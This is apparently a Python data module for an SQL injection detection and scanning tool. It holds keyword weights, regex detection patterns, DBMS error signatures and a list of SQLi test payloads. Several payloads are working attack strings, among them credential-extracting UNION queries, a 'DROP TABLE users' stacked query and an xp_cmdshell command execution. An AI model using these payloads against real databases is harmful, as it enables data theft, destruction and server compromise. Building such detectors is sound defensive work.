"""Signature and payload libraries used by the detection engine.

Everything here is assembled offline from public knowledge of SQL injection
patterns, DBMS error messages and canonical test payloads. No third-party
network service is ever contacted -- only (optionally) the target host when
the user explicitly enables live scanning.
"""

import re


NETLOC_RESERVED = ("localhost", "127.0.0.1", "::1")

DETECTION_TECHNIQUES = (
    "signature",            # payload signature hit
    "pattern",              # classic SQLi syntax construct
    "error_signature",      # DBMS error text spotted in traffic/response
    "keyword_density",      # heavy SQL keyword presence
    "meta_character",       # SQL meta characters in a risky context
    "boolean_blind",        # boolean-style comparison probe
    "time_based",           # sleep/waitfor/benchmark timing probe
    "stacked_queries",      # query chaining with ';'
    "dbms_fingerprint",     # DBMS-specific artefact
    "encoding_obfuscation", # URL/hex/base64 encoding used to hide payloads
)

TECHNIQUE_LABELS = {
    "signature": "Payload signature",
    "pattern": "Syntax pattern",
    "error_signature": "DBMS error signature",
    "keyword_density": "Keyword density",
    "meta_character": "Meta characters",
    "boolean_blind": "Boolean-blind condition",
    "time_based": "Time-based probe",
    "stacked_queries": "Stacked queries",
    "dbms_fingerprint": "DBMS fingerprint",
    "encoding_obfuscation": "Encoding obfuscation",
}

META_CHARS = ("'", '"', ";", "--", "/*", "*/", "#", "`")

# ---------------------------------------------------------------------------
# Keyword weights: how strongly a token suggests structured query manipulation
# ---------------------------------------------------------------------------
KEYWORD_WEIGHTS = {
    "select": 3, "union": 4, "insert": 3, "update": 3, "delete": 3,
    "drop": 5, "alter": 3, "truncate": 4, "create": 3, "grant": 4,
    "revoke": 4, "exec": 5, "execute": 4, "xp_cmdshell": 5,
    "information_schema": 4, "sys.tables": 4, "pg_catalog": 4,
    "mysql.user": 4, "from": 1, "where": 1, "having": 1, "group": 1,
    "order": 1, "by": 1, "limit": 1, "offset": 1, "or": 1, "and": 1,
    "not": 1, "null": 1, "is": 1, "in": 1, "like": 1, "between": 1,
    "case": 2, "when": 2, "then": 1, "else": 1, "end": 1, "cast": 3,
    "convert": 3, "char": 3, "substr": 3, "substring": 3, "ascii": 3,
    "length": 2, "concat": 3, "concat_ws": 3, "version": 3, "database": 4,
    "current_user": 4, "user": 2, "session_user": 4, "system_user": 4,
    "@@version": 4, "@@version_compile_os": 4, "@@datadir": 4,
    "sleep": 5, "pg_sleep": 5, "waitfor": 5, "benchmark": 5,
    "delay": 4, "if": 2, "load_file": 5, "into": 3, "outfile": 5,
    "dumpfile": 5, "extractvalue": 5, "updatexml": 5, "name_const": 4,
    "floor": 3, "rand": 2, "count": 2, "procedure": 4, "analyse": 4,
    "sysdate": 3, "newid": 3, "dbms_pipe": 5, "utl_http": 4,
    "utl_inaddr": 4, "rowcount": 3, "rownum": 2, "confirm": 2,
    "xp_regread": 5,
}

DBMS_KEYWORDS = {
    "mysql": ("information_schema", "mysql.user", "@@version", "load_file",
              "outfile", "dumpfile", "updatexml", "extractvalue",
              "sleep(", "benchmark(", "concat_ws", "group_concat",
              "into outfile"),
    "mssql": ("@@version", "xp_cmdshell", "waitfor delay", "sys.tables",
              "sys.columns", "sys.databases", "openrowset", "sp_oacreate",
              "db_name(", "top 1 ", "convert(int,", "cast(ascii("),
    "oracle": ("rownum", "utl_http", "utl_inaddr", "dbms_pipe",
               "user_tables", "all_tables", "all_users", "v$version",
               "dual", "chr(39)", "to_char", "to_number", "sys.xmltype",
               "from dual"),
    "postgres": ("pg_sleep", "pg_catalog", "pg_tables", "::text", "::int",
                 "current_database(", "version()", "cast(", "chr(",
                 "array_to_string"),
    "sqlite": ("sqlite_master", "group_concat", "zeroblob", "substr(",
               "randomblob"),
    "generic": ("or 1=1", "or 1=2", "and 1=1", "' or '", '" or "',
                "1=1", "1=2"),
}

# ---------------------------------------------------------------------------
# Detection patterns (PCRE)
# ---------------------------------------------------------------------------
PATTERNS = {
    "union_select": re.compile(
        r"union\s+(all\s+|distinct\s+|select\s+)?select\b", re.I),
    "error_based": re.compile(
        r"(?:extractvalue|updatexml)\s*\(\s*\d+|"
        r"'\s*(?:or|and)\s+(?:[a-z_]+|\w)\s*=\s*'\s*(?:or|and)\b", re.I),
    "boolean_blind": re.compile(
        r"\b(?:or|and)\b\s+['\"]?[a-z0-9_=()'\-\"]+\s*[<>=]=\s*\d+", re.I),
    "boolean_eq": re.compile(
        r"(?:or|and)\s+\d+\s*=\s*\d+", re.I),
    "time_mysql": re.compile(r"\bsleep\s*\(\s*\d+\s*\)", re.I),
    "time_pg": re.compile(r"\bpg_sleep\s*\(\s*\d+(?:\.\d+)?\s*\)", re.I),
    "time_mssql": re.compile(
        r"\bwaitfor\s+delay\s+'\s*t?\d+[:.]\d+[:.]?\d*'", re.I),
    "time_benchmark": re.compile(
        r"\bbenchmark\s*\(\s*\d+\s*,\s*[^)]*\)", re.I),
    "stacked": re.compile(
        r";\s*\b(?:select|insert|update|delete|drop|alter|exec|declare)\b",
        re.I),
    "comment_sql": re.compile(r"--[- ]?\s*(?:$|\s)", re.M),
    "comment_block": re.compile(r"/\*[^/]*\*/"),
    "comment_hash": re.compile(r"#\s*$", re.M),
    "union_count": re.compile(r"union\s+all\s+select", re.I),
    "sys_schema": re.compile(
        r"(?:information_schema|sys\.tables|sys\.columns|pg_catalog|"
        r"sqlite_master|user_tables|mysql\.user)\b", re.I),
    "version_probe": re.compile(
        r"(@@version|version\s*\(\s*\)|db_name\s*\(\s*\)|"
        r"database\s*\(\s*\))", re.I),
    "cast_probe": re.compile(
        r"(?:cast|convert)\s*\(\s*\w+\s+as\s+\w+", re.I),
    "ascii_probe": re.compile(r"\b(?:ascii|char|chr)\s*\(\s*\d+", re.I),
    "hex_encoded": re.compile(r"0x[0-9a-f]{4,}", re.I),
    "injection_probe": re.compile(
        r"(['\"])\s*(?:or|and|union|select|--|\1)\b", re.I),
    "quote_breakout": re.compile(r"'['\"]{0,}',\s*(?:or|and|union)", re.I),
}

ERROR_SIGNATURES = {
    "mysql": (
        r"you have an error in your sql syntax",
        r"mysql_fetch\w*\s*\(\)",
        r"mysql_numrows",
        r"supplied argument is not a valid mysql",
        r"warning:\s+\w*mysql\w*",
        r"mysqli\s+error",
        r"incorrect value(?:s)?:\s*'\w+'\s*for\s+column",
        r"check the manual that corresponds to your mysql",
    ),
    "mssql": (
        r"unclosed quotation mark after the character string",
        r"incorrect syntax near",
        r"microsoft\s+oledb",
        r"system\.data\.sqlclient\.sql",
        r"sqlserver\s+jdbc",
        r"line\s+\d+:\s+incorrect syntax",
        r"o\.?ld\.?b\.? provider",
        r"sqlstate[\s:]+(?:01000|42000|40)",
        r"the\s+multi-part.*could not be bound",
    ),
    "oracle": (
        r"\bora-\d{4,5}\b",
        r"oracle\s+(?:error|driver|server)",
        r"invalid\s+sql\s+statement",
        r"query\s+block\s+incorrect",
        r"ora-00933",
        r"sqlstate:\s+42000",
    ),
    "postgres": (
        r"syntax error at or near",
        r"pg_query\w*\(\)\s*:",
        r"postgresql\s+(?:query|error)",
        r"pq:\s+syntax error",
        r"invalid input syntax for type",
    ),
    "sqlite": (
        r"sqlite\w*[:\s]+syntax error",
        r"unrecognized token",
        r"near\s+[\"'].*[\"']\s*:\s*syntax error",
    ),
    "java": (
        r"java\.sql\..*exception",
        r"com\.mysql\.jdbc",
        r"org\.postgresql",
        r"jdbc[.\w]*\.driver",
    ),
    "generic": (
        r"sql\s+syntax",
        r"syntax\s+error",
        r"unclosed\s+quotation",
        r"unknown\s+column",
        r"failed\s+to\s+execute\s+(?:the\s+)?query",
        r"command\s+not\s+properly\s+ended",
        r"mysql|postgres|oracle|sqlite|odbc|jdbc",
    ),
}

# ---------------------------------------------------------------------------
# Canonical test payloads -- used both for signature detection in captured
# traffic and as the probe corpus for live scanning.
# ---------------------------------------------------------------------------
PAYLOADS = {
    "classic": (
        "' OR '1'='1",
        "' OR 1=1-- -",
        "1' OR '1'='1' --",
        "' OR 1=1#",
        "OR 1=1",
        "1 OR 1=1",
        "' OR '1'='1'/*",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND 1=1--",
        "admin'--",
        "admin' #",
        "1') OR ('1'='1",
        "1' OR '1'='1'",
        "' UNION SELECT NULL--",
    ),
    "union": (
        "' UNION SELECT 1-- -",
        "\" UNION SELECT 1-- -",
        "' UNION ALL SELECT NULL, NULL-- -",
        "' UNION SELECT username, password FROM users-- -",
        "1 UNION SELECT @@version, 2-- -",
        "1' UNION SELECT NULL-- -",
        "x' UNION SELECT 1,2,3#",
    ),
    "error": (
        "' AND (SELECT 6870 FROM(SELECT COUNT(*),CONCAT((SELECT version()),"
        "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND extractvalue(1,concat(0x7e,(select version())))#",
        "' AND updatexml(1,concat(0x7e,(select user())),1)#",
        "1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.tables)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "1' AND 1=CAST(@@version AS INT)-- -",
        "' AND ROWNUM=1 AND 1=UTL_HTTP.REQUEST('x')--",
    ),
    "boolean_blind": (
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND '1'='1",
        "' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND SLEEP(0)#",
        "1' OR 1=1 LIMIT 1#",
    ),
    "time_based": (
        "' AND SLEEP(3)-- -",
        "1' AND SLEEP(5)#",
        "' AND pg_sleep(3)--",
        "1'; WAITFOR DELAY '00:00:03'-- -",
        "1 AND ELT(1,SLEEP(3))-- -",
        "' OR BENCHMARK(5000000,SHA1('x'))#",
    ),
    "stacked": (
        "1'; DROP TABLE users-- -",
        "1'; SELECT SLEEP(3);-- -",
        "'; EXEC xp_cmdshell('whoami')--",
    ),
    "dbms_fingerprint": (
        "1' AND @@version-- -",
        "' AND version()-- -",
        "1' AND db_name()-- -",
        "' UNION SELECT @@version,@@servername--",
        "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables)-- -",
    ),
}

RISK_LEVELS = (
    ("Critical", (75, 101)),
    ("High", (50, 75)),
    ("Medium", (25, 50)),
    ("Low", (1, 25)),
    ("Safe", (0, 1)),
)


def risk_level(score):
    """Map a 0-100 score to a human label."""
    for label, (lo, hi) in RISK_LEVELS:
        if lo <= score < hi:
            return label
    return "Safe"